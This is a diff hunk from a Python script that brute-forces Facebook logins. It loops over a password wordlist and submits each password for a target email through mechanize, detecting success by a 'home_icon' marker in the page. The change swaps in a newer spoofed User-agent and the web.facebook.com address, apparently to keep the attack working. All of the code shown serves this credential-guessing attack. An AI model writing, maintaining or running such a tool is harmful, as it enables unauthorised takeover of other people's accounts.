@@ -52,15 +52,15 @@ for password in wordlist:
         try:
             browser = mechanize.Browser()
             browser.set_handle_robots(False)
-            browser.addheaders = [('User-agent', "Mozilla/62.0 (Windows NT 6.1)  Chrome/69.0.3497.100 Safari/537.36")]
-            fb = browser.open('https://www.facebook.com')
+            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+            fb = browser.open('https://web.facebook.com')
             dos = open('Facebook-Log.txt', 'w+')
             browser.select_form(nr=0)
             browser.form['email'] = user
             browser.form['pass'] = password
             browser.method = 'POST'
             browser.submit()
-            dos.write(browser.open('https://www.facebook.com').read())
+            dos.write(browser.open('https://web.facebook.com').read())
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
